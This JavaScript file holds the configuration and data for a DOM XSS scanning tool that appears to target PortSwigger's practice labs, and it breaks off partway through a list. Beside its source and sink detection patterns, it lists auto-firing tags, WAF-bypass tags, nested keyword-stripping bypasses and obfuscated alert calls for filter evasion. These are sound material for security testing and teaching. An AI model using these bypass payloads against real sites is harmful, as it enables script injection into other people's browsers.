/**
 * DOM XSS Hunter v4.6 — Configuration & Data Definitions
 * Comprehensive coverage for all PortSwigger XSS lab scenarios
 * Shared namespace: window.__DOMXSS
 */
(function () {
  'use strict';

  const ns = (window.__DOMXSS = window.__DOMXSS || {});

  // Initialize shared state early so all modules can reference it
  ns.state = ns.state || {
    idCounter: 1,
    findings: { sources: [], sinks: [], runtimeCalls: [], flows: [] },
    seen: new Set(),
    seenScripts: new Set(),
    highlightedEls: [],
    observer: null,
    originalFunctions: {},
    csp: null,
    frameworks: null,
    resources: [],
  };

  ns.CONFIG = {
    debug: false,
    autofillEnabled: false,
    sstiEnabled: false,
    cstiEnabled: false,
    protoPollutionEnabled: false,
    maxCodePreview: 200,
    enableRuntimeHooks: true,
    enableMutationObserver: true,
    filterLibraries: true,
    highlightColor: '#ff0000',
    highlightWidth: '3px',
    highlightStyle: 'solid',
    libraryPatterns: [
      /jquery[-.]?\d/i, /angular[.-]/i, /react[-.]?(dom)?/i, /vue[.-]/i,
      /bootstrap[.-]/i, /lodash/i, /underscore/i, /backbone/i, /ember/i,
      /moment/i, /d3[.-]/i, /chart[.-]?js/i, /gsap/i, /three[.-]/i,
      /socket[.-]?io/i, /polyfill/i, /modernizr/i, /sentry/i, /hotjar/i,
      /gtag/i, /analytics/i, /recaptcha/i, /cloudflare/i, /cdn[-.]?min/i,
      /vendor/i, /bundle\.min/i,
    ],
    delays: {
      betweenTests: 800,       // ms between payload injections
      postRedirect: 500,       // ms wait after redirect/navigation
      retryWait: 1500,         // ms before retry on delayed storage
      wafProbe: 100,           // ms between WAF enumeration requests
      wafProbeAggressive: 200, // ms for aggressive WAF probing
      injectWait: 600,         // ms after injection before checking
      verifyTimeout: 8000,     // ms timeout for payload verification
      longTimeout: 10000,      // ms timeout for slow operations
    },
  };

  // =====================================================
  // SOURCES — All controllable input vectors
  // =====================================================
  ns.SOURCES = [
    // URL: FULLY CONTROLLABLE
    { pattern: /location\s*\.\s*search/gi, category: 'URL', severity: 'high',
      manipulable: 'full', why: 'Query string — attacker controls 100% via ?param=payload' },
    { pattern: /location\s*\.\s*hash/gi, category: 'URL', severity: 'high',
      manipulable: 'full', why: 'Fragment — attacker controls 100% via #payload (never sent to server)' },
    { pattern: /document\s*\.\s*referrer/gi, category: 'Referrer', severity: 'high',
      manipulable: 'full', why: 'Controllable — attacker links victim with arbitrary referrer' },

    // URL: PARTIALLY CONTROLLABLE
    { pattern: /location\s*\.\s*href(?!\s*=)/gi, category: 'URL', severity: 'high',
      manipulable: 'partial', why: 'Full URL — query/hash controllable, host fixed' },
    { pattern: /location\s*\.\s*pathname/gi, category: 'URL', severity: 'medium',
      manipulable: 'partial', why: 'Path — controllable with dynamic routes' },
    { pattern: /document\s*\.\s*URL/g, category: 'URL', severity: 'high',
      manipulable: 'partial', why: 'Full URL — query/hash are controllable' },
    { pattern: /document\s*\.\s*documentURI/gi, category: 'URL', severity: 'high',
      manipulable: 'partial', why: 'Document URI — similar to document.URL' },
    { pattern: /location\s*\.\s*toString\s*\(/gi, category: 'URL', severity: 'high',
      manipulable: 'partial', why: 'Serializes full URL — includes controllable parts' },

    // URL: NOT CONTROLLABLE
    { pattern: /location\s*\.\s*origin/gi, category: 'URL', severity: 'low',
      manipulable: 'none', why: 'Origin (scheme+host+port) — fixed, NOT controllable' },
    { pattern: /location\s*\.\s*protocol/gi, category: 'URL', severity: 'low',
      manipulable: 'none', why: 'Protocol — fixed' },
    { pattern: /location\s*\.\s*host(?:name)?/gi, category: 'URL', severity: 'low',
      manipulable: 'none', why: 'Hostname — fixed (unless subdomain takeover)' },

    // Generic location
    { pattern: /document\s*\.\s*location(?!\s*\.)/gi, category: 'URL', severity: 'medium',
      manipulable: 'partial', why: 'Depends on property accessed (.search=full, .origin=none)' },
    { pattern: /window\s*\.\s*location(?!\s*=)(?!\s*\.)/gi, category: 'URL', severity: 'medium',
      manipulable: 'partial', why: 'Depends on property accessed (.search=full, .origin=none)' },
    { pattern: /document\s*\.\s*baseURI/gi, category: 'URL', severity: 'low',
      manipulable: 'none', why: 'Base URI — fixed unless <base> tag injection' },

    // Cookies
    { pattern: /document\s*\.\s*cookie/gi, category: 'Cookie', severity: 'medium',
      manipulable: 'conditional', why: 'Only if cookie injection (CRLF, subdomain)' },

    // Storage
    { pattern: /localStorage\s*\.\s*getItem\s*\(/gi, category: 'Storage', severity: 'medium',
      manipulable: 'conditional', why: 'Controllable IF attacker can write first (via XSS/subdomain)' },
    { pattern: /sessionStorage\s*\.\s*getItem\s*\(/gi, category: 'Storage', severity: 'medium',
      manipulable: 'conditional', why: 'Similar to localStorage — requires prior write' },
    { pattern: /localStorage\s*\[/gi, category: 'Storage', severity: 'medium',
      manipulable: 'conditional', why: 'Bracket access to localStorage' },
    { pattern: /sessionStorage\s*\[/gi, category: 'Storage', severity: 'medium',
      manipulable: 'conditional', why: 'Bracket access to sessionStorage' },

    // PostMessage
    { pattern: /addEventListener\s*\(\s*['"`]message['"`]/gi, category: 'PostMessage', severity: 'high',
      manipulable: 'full', why: 'ANY window can send postMessage — controllable without origin check' },
    { pattern: /onmessage\s*=/gi, category: 'PostMessage', severity: 'high',
      manipulable: 'full', why: 'Message handler — controllable if no origin validation' },

    // URL API
    { pattern: /new\s+URL\s*\(/gi, category: 'URL API', severity: 'medium',
      manipulable: 'conditional', why: 'Depends on argument — check what is passed' },
    { pattern: /URLSearchParams/gi, category: 'URL API', severity: 'high',
      manipulable: 'full', why: 'Parses query string — attacker controls params via URL' },
    { pattern: /\.searchParams\s*\.\s*get\s*\(/gi, category: 'URL API', severity: 'high',
      manipulable: 'full', why: 'Extracts specific parameter — fully controllable via query' },

    // Input
    { pattern: /\.value\b/gi, category: 'Input', severity: 'low',
      manipulable: 'full', why: 'Form input — user types directly (self-XSS unless reflected)' },
    { pattern: /\.textContent/gi, category: 'Input', severity: 'low',
      manipulable: 'none', why: 'DOM text read — not externally controllable' },
    { pattern: /\.innerText/gi, category: 'Input', severity: 'low',
      manipulable: 'none', why: 'DOM text read — not externally controllable' },

    // Decode (amplifiers)
    { pattern: /decodeURIComponent\s*\(/gi, category: 'Decode', severity: 'medium',
      manipulable: 'conditional', why: 'Amplifies input — dangerous if decoding controllable source' },
    { pattern: /decodeURI\s*\(/gi, category: 'Decode', severity: 'medium',
      manipulable: 'conditional', why: 'Similar to decodeURIComponent' },
    { pattern: /unescape\s*\(/gi, category: 'Decode', severity: 'medium',
      manipulable: 'conditional', why: 'Legacy decode — amplifies encoded payloads' },
    { pattern: /atob\s*\(/gi, category: 'Decode', severity: 'medium',
      manipulable: 'conditional', why: 'Base64 decode — dangerous if b64 comes from URL' },

    // Window name
    { pattern: /window\s*\.\s*name/gi, category: 'Window.name', severity: 'high',
      manipulable: 'full', why: 'Attacker controls via window.open("victim","PAYLOAD")' },

    // XHR / Fetch responses
    { pattern: /\.responseText/gi, category: 'XHR Response', severity: 'medium',
      manipulable: 'conditional', why: 'Controllable if XHR URL is manipulable or response reflects input' },
    { pattern: /\.responseXML/gi, category: 'XHR Response', severity: 'medium',
      manipulable: 'conditional', why: 'Similar to responseText but XML' },
    { pattern: /\.response\b/gi, category: 'XHR Response', severity: 'low',
      manipulable: 'conditional', why: 'Generic — depends on endpoint' },
    { pattern: /\.json\s*\(\s*\)/gi, category: 'Fetch Response', severity: 'medium',
      manipulable: 'conditional', why: 'Fetch JSON response — controllable if endpoint reflects input' },
    { pattern: /\.text\s*\(\s*\)/gi, category: 'Fetch Response', severity: 'medium',
      manipulable: 'conditional', why: 'Fetch text response — controllable if endpoint reflects input' },

    // Document domain (subdomain takeover)
    { pattern: /document\s*\.\s*domain/gi, category: 'Domain', severity: 'medium',
      manipulable: 'conditional', why: 'document.domain relaxation — enables cross-subdomain attacks' },

    // Cross-window references
    { pattern: /window\s*\.\s*opener/gi, category: 'Cross-Window', severity: 'high',
      manipulable: 'full', why: 'Opener window reference — controllable if opened by attacker' },
    { pattern: /window\s*\.\s*parent/gi, category: 'Cross-Window', severity: 'medium',
      manipulable: 'conditional', why: 'Parent frame reference — controllable if framed by attacker' },
    { pattern: /window\s*\.\s*top/gi, category: 'Cross-Window', severity: 'medium',
      manipulable: 'conditional', why: 'Top window reference — controllable if framed by attacker' },
    { pattern: /window\s*\.\s*frames/gi, category: 'Cross-Window', severity: 'medium',
      manipulable: 'conditional', why: 'Frame references — controllable if attacker controls iframes' },

    // Hashchange/popstate events
    { pattern: /addEventListener\s*\(\s*['"`]hashchange['"`]/gi, category: 'URL Event', severity: 'high',
      manipulable: 'full', why: 'Fires when hash changes — attacker controls hash via link/iframe' },
    { pattern: /addEventListener\s*\(\s*['"`]popstate['"`]/gi, category: 'URL Event', severity: 'medium',
      manipulable: 'partial', why: 'Fires on history navigation — limited control' },
  ];

  // =====================================================
  // SINKS — All dangerous output points
  // =====================================================
  ns.SINKS = [
    // JS Execution — CRITICAL
    { pattern: /\beval\s*\(/gi, category: 'JS Execution', severity: 'critical' },
    { pattern: /new\s+Function\s*\(/gi, category: 'JS Execution', severity: 'critical' },
    { pattern: /setTimeout\s*\(\s*['"`]/gi, category: 'JS Execution', severity: 'critical' },
    { pattern: /setInterval\s*\(\s*['"`]/gi, category: 'JS Execution', severity: 'critical' },
    { pattern: /setTimeout\s*\(\s*[^,)]+,/gi, category: 'JS Execution', severity: 'high' },
    { pattern: /setInterval\s*\(\s*[^,)]+,/gi, category: 'JS Execution', severity: 'high' },

    // HTML Injection — CRITICAL
    { pattern: /\.innerHTML\s*=/gi, category: 'HTML Injection', severity: 'critical' },
    { pattern: /\.outerHTML\s*=/gi, category: 'HTML Injection', severity: 'critical' },
    { pattern: /document\s*\.\s*write\s*\(/gi, category: 'HTML Injection', severity: 'critical' },
    { pattern: /document\s*\.\s*writeln\s*\(/gi, category: 'HTML Injection', severity: 'critical' },
    { pattern: /\.insertAdjacentHTML\s*\(/gi, category: 'HTML Injection', severity: 'critical' },

    // Navigation / Open redirect
    { pattern: /location\s*\.\s*href\s*=/gi, category: 'Navigation', severity: 'high' },
    { pattern: /location\s*\.\s*assign\s*\(/gi, category: 'Navigation', severity: 'high' },
    { pattern: /location\s*\.\s*replace\s*\(/gi, category: 'Navigation', severity: 'high' },
    { pattern: /window\s*\.\s*open\s*\(/gi, category: 'Navigation', severity: 'high' },
    { pattern: /window\s*\.\s*location\s*=/gi, category: 'Navigation', severity: 'high' },

    // Dangerous attributes
    { pattern: /\.setAttribute\s*\(\s*['"`](href|src|action|formaction|data|codebase|srcdoc|xlink:href|ping|poster|background)['"`]/gi, category: 'Attr Injection', severity: 'high' },
    { pattern: /\.setAttribute\s*\(\s*['"`]on\w+['"`]/gi, category: 'Event Handler', severity: 'critical' },
    { pattern: /\.src\s*=/gi, category: 'Attr Injection', severity: 'high' },
    { pattern: /\.href\s*=/gi, category: 'Attr Injection', severity: 'high' },
    { pattern: /\.action\s*=/gi, category: 'Attr Injection', severity: 'high' },
    { pattern: /\.srcdoc\s*=/gi, category: 'Attr Injection', severity: 'critical' },

    // Event handlers (comprehensive)
    { pattern: /\.on(error|load|click|mouseover|focus|blur|change|submit|input|keydown|keyup|keypress|mouseout|mouseenter|mouseleave|mousedown|mouseup|dblclick|contextmenu|wheel|scroll|resize|animationstart|animationend|animationiteration|transitionend|transitionstart|transitionrun|toggle|pointerover|pointerout|pointerenter|pointerleave|pointermove|pointerdown|pointerup|touchstart|touchend|touchmove|dragstart|drag|dragend|dragenter|dragleave|dragover|drop|copy|cut|paste|beforeinput|compositionstart|compositionend|focusin|focusout|hashchange|popstate|message|beforeunload|unload|abort|canplay|canplaythrough|durationchange|emptied|ended|loadeddata|loadedmetadata|loadstart|pause|play|playing|progress|ratechange|seeked|seeking|stalled|suspend|timeupdate|volumechange|waiting|selectstart|selectionchange|select|invalid|reset|search|show|close|cancel)\s*=/gi, category: 'Event Handler', severity: 'high' },

    // DOM creation
    { pattern: /document\s*\.\s*createElement\s*\(\s*['"`]script['"`]\s*\)/gi, category: 'Script Creation', severity: 'critical' },
    { pattern: /document\s*\.\s*createElement\s*\(\s*['"`]iframe['"`]\s*\)/gi, category: 'Iframe Creation', severity: 'high' },
    { pattern: /document\s*\.\s*createElement\s*\(\s*['"`]embed['"`]\s*\)/gi, category: 'Embed Creation', severity: 'high' },
    { pattern: /document\s*\.\s*createElement\s*\(\s*['"`]object['"`]\s*\)/gi, category: 'Object Creation', severity: 'high' },
    { pattern: /document\s*\.\s*createElement\s*\(\s*['"`]svg['"`]\s*\)/gi, category: 'SVG Creation', severity: 'medium' },

    // Range / Fragment
    { pattern: /\.createContextualFragment\s*\(/gi, category: 'Fragment Injection', severity: 'critical' },
    { pattern: /new\s+DOMParser\s*\(/gi, category: 'DOM Parser', severity: 'medium' },

    // jQuery
    { pattern: /\$\s*\(\s*['"`]?\s*<[^>]/gi, category: 'jQuery HTML', severity: 'critical' },
    { pattern: /jQuery\s*\(\s*['"`]?\s*<[^>]/gi, category: 'jQuery HTML', severity: 'critical' },
    { pattern: /\$\s*\(\s*[^'"`\s<]/gi, category: 'jQuery Selector', severity: 'high' },
    { pattern: /\.html\s*\(\s*[^)]/gi, category: 'jQuery HTML', severity: 'high' },
    { pattern: /\.append\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /\.prepend\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /\.after\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /\.before\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /\.replaceWith\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /\.wrap\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /\.wrapInner\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /\.wrapAll\s*\(\s*['"`]?\s*</gi, category: 'jQuery DOM', severity: 'high' },
    { pattern: /jQuery\s*\.\s*parseHTML\s*\(/gi, category: 'jQuery Parse', severity: 'high' },
    { pattern: /\$\s*\.\s*parseHTML\s*\(/gi, category: 'jQuery Parse', severity: 'high' },
    { pattern: /\.globalEval\s*\(/gi, category: 'jQuery Eval', severity: 'critical' },

    // jQuery attr/prop
    { pattern: /\.attr\s*\(\s*['"`](href|src|action|formaction|srcdoc|on\w+)['"`]/gi, category: 'jQuery Attr Sink', severity: 'high' },
    { pattern: /\.prop\s*\(\s*['"`](href|src|action|innerHTML|outerHTML)['"`]/gi, category: 'jQuery Prop Sink', severity: 'high' },

    // Blob / PostMessage
    { pattern: /URL\s*\.\s*createObjectURL\s*\(/gi, category: 'Blob URL', severity: 'medium' },
    { pattern: /\.postMessage\s*\(/gi, category: 'PostMessage Sink', severity: 'medium' },

    // Trusted Types
    { pattern: /trustedTypes\s*\.\s*createPolicy\s*\(/gi, category: 'Trusted Types', severity: 'medium' },

    // Dynamic fetch/XHR
    { pattern: /fetch\s*\(\s*[^'"`\s]/gi, category: 'Fetch Dynamic', severity: 'medium' },
    { pattern: /\.open\s*\(\s*['"`]\w+['"`]\s*,\s*[^'"`]/gi, category: 'XHR Dynamic', severity: 'medium' },

    // AngularJS
    { pattern: /\$sce\s*\.\s*trustAs(Html|ResourceUrl|Url|Js)\s*\(/gi, category: 'Angular Trust', severity: 'critical' },
    { pattern: /ng-bind-html\s*=/gi, category: 'Angular HTML Binding', severity: 'high' },
    { pattern: /\{\{[\s\S]*?\}\}/gi, category: 'Angular Expression', severity: 'medium' },

    // Vue.js
    { pattern: /v-html\s*=/gi, category: 'Vue HTML', severity: 'high' },

    // React
    { pattern: /dangerouslySetInnerHTML/gi, category: 'React Unsafe HTML', severity: 'critical' },

    // Import / Worker
    { pattern: /importScripts\s*\(/gi, category: 'Script Import', severity: 'critical' },
    { pattern: /new\s+Worker\s*\(/gi, category: 'Worker Creation', severity: 'high' },
    { pattern: /new\s+SharedWorker\s*\(/gi, category: 'Worker Creation', severity: 'high' },
  ];

  // =====================================================
  // ALL EVENT HANDLERS — comprehensive from PortSwigger cheatsheet
  // =====================================================
  ns.ALL_EVENTS = [
    // No interaction required
    'onload', 'onerror', 'onanimationstart', 'onanimationend', 'onanimationiteration',
    'onanimationcancel', 'ontransitionstart', 'ontransitionend', 'ontransitionrun',
    'ontransitioncancel', 'onwebkitanimationstart', 'onwebkitanimationend',
    'onwebkitanimationiteration', 'onwebkittransitionend',
    'onfocus', 'onfocusin', 'onblur', 'onfocusout',
    'oncanplay', 'oncanplaythrough', 'ondurationchange', 'onended', 'onloadeddata',
    'onloadedmetadata', 'onloadstart', 'onplay', 'onplaying', 'onprogress',
    'onsuspend', 'ontimeupdate', 'onvolumechange', 'onwaiting', 'oncuechange',
    'onbeforeprint', 'onafterprint', 'onhashchange', 'onpopstate',
    'onpageshow', 'onpagehide', 'onmessage', 'onresize', 'onscroll', 'onscrollend',
    'ontoggle', 'onbeforetoggle', 'oninvalid', 'onreset', 'onformdata',
    'onslotchange', 'onsecuritypolicyviolation',
    'onpointerover', 'onpointerenter', 'onpointermove', 'onpointerout',
    'onpointerleave', 'ongotpointercapture', 'onlostpointercapture',
    'onbeforematch', 'oncontentvisibilityautostatechange',
    'onsearch', 'onselect', 'onselectionchange', 'onselectstart',
    // SVG-specific (no interaction)
    'onbegin', 'onend', 'onrepeat',
    // Interaction required
    'onclick', 'ondblclick', 'oncontextmenu', 'onauxclick',
    'onmouseover', 'onmouseout', 'onmouseenter', 'onmouseleave',
    'onmousemove', 'onmousedown', 'onmouseup',
    'onchange', 'oninput', 'onsubmit', 'oncancel',
    'ondrag', 'ondragstart', 'ondragend', 'ondragenter', 'ondragleave',
    'ondragover', 'ondrop',
    'oncopy', 'oncut', 'onpaste', 'onbeforecopy', 'onbeforecut', 'onbeforepaste',
    'onbeforeinput',
    'onkeydown', 'onkeyup', 'onkeypress',
    'ontouchstart', 'ontouchend', 'ontouchmove', 'ontouchcancel',
    'onwheel',
    'onclose',
    'onabort',
  ];

  // Events that fire automatically (no user interaction needed)
  ns.AUTO_EVENTS = [
    'onload', 'onerror', 'onanimationstart', 'onanimationend', 'onanimationiteration',
    'ontransitionstart', 'ontransitionend', 'ontransitionrun',
    'onfocus', 'onfocusin', 'onblur',
    'oncanplay', 'ondurationchange', 'onended', 'onloadeddata', 'onloadedmetadata',
    'onloadstart', 'onplay', 'onplaying', 'onprogress', 'ontimeupdate',
    'onpageshow', 'onresize', 'onscroll', 'onscrollend',
    'ontoggle', 'onbeforetoggle',
    'onpointerover', 'onpointerenter', 'onpointermove',
    'onbegin', 'onend', 'onrepeat',
    'onbeforematch', 'onsearch',
  ];

  // =====================================================
  // ALL HTML TAGS — comprehensive from PortSwigger cheatsheet
  // =====================================================
  ns.ALL_TAGS = [
    // Standard tags that commonly support event handlers
    'a', 'abbr', 'address', 'article', 'aside', 'audio', 'b', 'body', 'br',
    'button', 'canvas', 'code', 'details', 'dialog', 'div', 'embed', 'fieldset',
    'figure', 'footer', 'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'header',
    'hr', 'i', 'iframe', 'img', 'input', 'ins', 'kbd', 'label', 'legend', 'li',
    'link', 'main', 'marquee', 'menu', 'meta', 'nav', 'object', 'ol', 'optgroup',
    'option', 'output', 'p', 'pre', 'progress', 'script', 'section', 'select',
    'slot', 'source', 'span', 'style', 'svg', 'table', 'textarea', 'time',
    'title', 'track', 'ul', 'var', 'video',
    // Less common but exploitable
    'animate', 'animatemotion', 'animatetransform', 'set',
    'math', 'mtext', 'mglyph', 'malignmark',
    'image', 'keygen', 'listing', 'xmp', 'noembed', 'noframes', 'noscript',
    'plaintext', 'summary', 'template',
    // Custom elements (WAF bypass)
    'xss', 'custom-tag', 'x',
  ];

  // Tags that often trigger events without interaction
  ns.AUTO_FIRE_TAGS = {
    'img':     { event: 'onerror', attrs: 'src=x' },
    'svg':     { event: 'onload', attrs: '' },
    'body':    { event: 'onload', attrs: '' },
    'video':   { event: 'onloadstart', attrs: 'src=x' },  // also: '<source src=x onerror=X>'
    'audio':   { event: 'onloadstart', attrs: 'src=x' },
    'input':   { event: 'onfocus', attrs: 'autofocus' },
    'select':  { event: 'onfocus', attrs: 'autofocus' },
    'textarea':{ event: 'onfocus', attrs: 'autofocus' },
    'details': { event: 'ontoggle', attrs: 'open' },
    'marquee': { event: 'onstart', attrs: '' },
    'embed':   { event: 'onload', attrs: 'src=x' },
    'object':  { event: 'onerror', attrs: 'data=x' },
    'iframe':  { event: 'onload', attrs: 'src=about:blank' },
    'link':    { event: 'onerror', attrs: 'href=x' },
    'source':  { event: 'onerror', attrs: 'src=x' },  // inside video/audio
    'track':   { event: 'onerror', attrs: 'src=x' },   // inside video/audio
    'style':   { event: 'onload', attrs: '' },
    // SVG animation elements
    'animate':          { event: 'onbegin', attrs: 'attributeName=x dur=1s' },
    'animatetransform': { event: 'onbegin', attrs: 'attributeName=transform type=rotate dur=1s' },
    'set':              { event: 'onbegin', attrs: 'attributeName=x to=1 dur=1s' },
    // Custom elements with tabindex + onfocus (WAF bypass)
    'xss':              { event: 'onfocus', attrs: 'tabindex=1 id=x' },
  };

  ns.PROBE_CHARS = {
    '<':  { html: 'critical', js: 'low',    url: 'low'  },
    '>':  { html: 'critical', js: 'low',    url: 'low'  },
    '"':  { html: 'high',     js: 'high',   url: 'medium' },
    "'":  { html: 'high',     js: 'critical', url: 'medium' },
    '`':  { html: 'low',      js: 'critical', url: 'low'  },
    '/':  { html: 'medium',   js: 'medium', url: 'high' },
    '\\': { html: 'low',      js: 'high',   url: 'low'  },
    '(':  { html: 'medium',   js: 'high',   url: 'medium' },
    ')':  { html: 'medium',   js: 'high',   url: 'medium' },
    '{':  { html: 'low',      js: 'high',   url: 'low'  },
    '}':  { html: 'low',      js: 'high',   url: 'low'  },
    '=':  { html: 'high',     js: 'medium', url: 'medium' },
    ';':  { html: 'medium',   js: 'high',   url: 'medium' },
    ':':  { html: 'medium',   js: 'low',    url: 'high' },
    '&':  { html: 'high',     js: 'low',    url: 'high' },
    '|':  { html: 'low',      js: 'medium', url: 'low'  },
    ' ':  { html: 'medium',   js: 'low',    url: 'medium' },
    '$':  { html: 'low',      js: 'high',   url: 'low'  },
    '-':  { html: 'medium',   js: 'medium', url: 'low'  },
    '.':  { html: 'low',      js: 'medium', url: 'medium' },
    '[':  { html: 'low',      js: 'medium', url: 'low'  },
    ']':  { html: 'low',      js: 'medium', url: 'low'  },
  };

  // =====================================================
  // ENCODING PATTERNS — comprehensive detection
  // =====================================================
  ns.ENCODING_PATTERNS = {
    htmlEntity: {
      '<': ['&lt;', '&#60;', '&#x3c;', '&#x3C;', '&#060;', '&#0060;', '&#x0003c;', '&#x0003C;'],
      '>': ['&gt;', '&#62;', '&#x3e;', '&#x3E;', '&#062;', '&#0062;', '&#x0003e;', '&#x0003E;'],
      '"': ['&quot;', '&#34;', '&#x22;', '&#034;', '&#0034;'],
      "'": ['&#39;', '&#x27;', '&apos;', '&#039;', '&#0039;'],
      '&': ['&amp;', '&#38;', '&#x26;'],
      '/': ['&#47;', '&#x2f;', '&#x2F;'],
    },
    urlEncoded: {
      '<': ['%3C', '%3c'], '>': ['%3E', '%3e'], '"': ['%22'], "'": ['%27'],
      ' ': ['%20', '+'], '&': ['%26'], '=': ['%3D', '%3d'], '/': ['%2F', '%2f'],
      '\\': ['%5C', '%5c'], '(': ['%28'], ')': ['%29'], '{': ['%7B', '%7b'],
      '}': ['%7D', '%7d'], ';': ['%3B', '%3b'], ':': ['%3A', '%3a'],
      '`': ['%60'], '|': ['%7C', '%7c'], '$': ['%24'],
      '[': ['%5B', '%5b'], ']': ['%5D', '%5d'],
    },
    jsUnicode: {
      '<': ['\\u003c', '\\u003C'], '>': ['\\u003e', '\\u003E'],
      '"': ['\\u0022'], "'": ['\\u0027'], '`': ['\\u0060'],
      '/': ['\\u002f', '\\u002F'], '\\': ['\\u005c', '\\u005C'],
      '(': ['\\u0028'], ')': ['\\u0029'],
    },
    jsHex: {
      '<': ['\\x3c', '\\x3C'], '>': ['\\x3e', '\\x3E'],
      '"': ['\\x22'], "'": ['\\x27'], '`': ['\\x60'],
      '/': ['\\x2f', '\\x2F'], '\\': ['\\x5c', '\\x5C'],
    },
    jsOctal: {
      '<': ['\\74'], '>': ['\\76'], '"': ['\\42'], "'": ['\\47'],
    },
    doubleEncoded: {
      '<': ['%253C', '%253c'], '>': ['%253E', '%253e'],
      '"': ['%2522'], "'": ['%2527'],
    },
    cssEscape: {
      '<': ['\\3c', '\\3C', '\\003c', '\\003C'],
      '>': ['\\3e', '\\3E', '\\003e', '\\003E'],
      '"': ['\\22', '\\0022'],
      "'": ['\\27', '\\0027'],
      '/': ['\\2f', '\\2F'],
      '(': ['\\28'], ')': ['\\29'],
    },
    unicodeFullwidth: {
      '<': ['\uff1c'], '>': ['\uff1e'], '"': ['\uff02'],
      "'": ['\uff07'], '/': ['\uff0f'], '(': ['\uff08'],
      ')': ['\uff09'], '{': ['\uff5b'], '}': ['\uff5d'],
    },
    backslashEscape: {
      "'": ["\\'"], '"': ['\\"'], '`': ['\\`'], '\\': ['\\\\'],
    },
  };

  // =====================================================
  // SACRIFICIAL PREFIXES — consume first-occurrence-only replace()
  // =====================================================
  ns.SACRIFICIAL_PREFIXES = {
    '<': ['<>', '<<'],
    '>': ['<>', '>>'],
    '"': ['"" '],
    "'": ["'' "],
    '<>': ['<>'],
  };

  // =====================================================
  // FLAWED SANITIZER PATTERNS — static detection of string .replace()
  // =====================================================
  ns.FLAWED_SANITIZER_PATTERNS = [
    { pattern: /\.replace\s*\(\s*['"]<['"]\s*,/g,   char: '<', desc: 'replace("<", ...) — first occurrence only, not /</g' },
    { pattern: /\.replace\s*\(\s*['"]>['"]\s*,/g,    char: '>', desc: 'replace(">", ...) — first occurrence only, not />/g' },
    { pattern: /\.replace\s*\(\s*['"]\\"['"]\s*,/g,  char: '"', desc: 'replace(\'"\', ...) — first occurrence only' },
    { pattern: /\.replace\s*\(\s*["']'["']\s*,/g,    char: "'", desc: "replace(\"'\", ...) — first occurrence only" },
    { pattern: /\.replace\s*\(\s*['"]<script>?['"]\s*,\s*['"]['"]?\s*\)/g, char: '<', desc: 'Single-pass tag stripping — <scrscriptipt> bypass' },
    { pattern: /\.replace\s*\(\s*['"]<[^>]*>['"]\s*,\s*['"]['"]?\s*\)/g, char: '<', desc: 'String-based tag removal — not recursive' },
  ];

  // =====================================================
  // KEYWORD STRIPPING — detection and bypass for server-side keyword removal
  // =====================================================

  // Keywords to probe for server-side stripping
  ns.KEYWORD_PROBE_LIST = [
    // Tag names
    'script', 'img', 'svg', 'iframe', 'body', 'input', 'details', 'video',
    'audio', 'object', 'embed', 'link', 'style', 'select', 'textarea',
    'math', 'animate', 'marquee', 'xss',
    // Event handlers
    'onerror', 'onload', 'onfocus', 'ontoggle', 'onmouseover', 'onclick',
    'onbegin', 'onanimationstart', 'onpointerover', 'onloadstart', 'ontransitionend',
    // JS functions/keywords
    'alert', 'prompt', 'confirm', 'print', 'eval', 'function', 'constructor',
    'javascript', 'expression',
  ];

  // Bypass patterns for stripped keywords — nested insertion so removal yields the keyword
  ns.KEYWORD_BYPASS_PATTERNS = {
    // tag names
    'script':    ['scrscriptipt', 'scr\tipt', 'Script', 'SCRIPT', 'ScRiPt'],
    'img':       ['imimgg', 'IMG', 'Img'],
    'svg':       ['svsvgg', 'SVG', 'Svg'],
    'iframe':    ['ifriframeame', 'IFRAME', 'Iframe'],
    'body':      ['bobodydy', 'BODY', 'Body'],
    'input':     ['ininputput', 'INPUT', 'Input'],
    'details':   ['detdetailsails', 'DETAILS', 'Details'],
    'style':     ['ststyleyle', 'STYLE', 'Style'],
    'select':    ['selselectect', 'SELECT', 'Select'],
    'textarea':  ['texttextareaarea', 'TEXTAREA', 'Textarea'],
    'math':      ['mamathth', 'MATH', 'Math'],
    'animate':   ['anianimatemate', 'ANIMATE', 'Animate'],
    // event handlers
    'onerror':   ['ononerrorerror', 'ONERROR', 'OnError'],
    'onload':    ['ononloadload', 'ONLOAD', 'OnLoad'],
    'onfocus':   ['ononfocusfocus', 'ONFOCUS', 'OnFocus'],
    'ontoggle':  ['onontoggletoggle', 'ONTOGGLE', 'OnToggle'],
    'onmouseover': ['ononmouseovermouseover', 'ONMOUSEOVER'],
    'onclick':   ['ononclickclick', 'ONCLICK', 'OnClick'],
    // JS keywords
    'alert':     ['alalertert', 'ALERT', 'Alert'],
    'prompt':    ['prpromptompt', 'PROMPT'],
    'confirm':   ['conconfirmfirm', 'CONFIRM'],
    'eval':      ['evevalal', 'EVAL'],
    'javascript':['jajavascriptvascript', 'JAVASCRIPT', 'Javascript', 'JaVaScRiPt'],
    'constructor':['consconstructortructor', 'CONSTRUCTOR', 'Constructor'],
  };

  // Alternative JS execution functions — ordered by preference
  // Used when 'alert' is blocked/stripped by the server
  ns.JS_FUNC_ALTERNATIVES = [
    { func: 'alert',     call: 'alert(1)',     desc: 'alert (standard)' },
    { func: 'print',     call: 'print()',      desc: 'print (opens print dialog)' },
    { func: 'prompt',    call: 'prompt(1)',     desc: 'prompt (shows dialog)' },
    { func: 'confirm',   call: 'confirm(1)',    desc: 'confirm (shows dialog)' },
    // Obfuscated alert variants (when "alert" keyword is stripped)
    { func: null, call: "window['al'+'ert'](1)",                desc: 'string concat alert' },
    { func: null, call: "self['alert'](1)",                      desc: 'self reference alert' },
    { func: null, call: "top['alert'](1)",                       desc: 'top reference alert' },
    { func: null, call: "[].constructor.constructor('alert(1)')()", desc: 'Function constructor' },
    { func: null, call: "eval('al'+'ert(1)')",                  desc: 'eval string concat' },
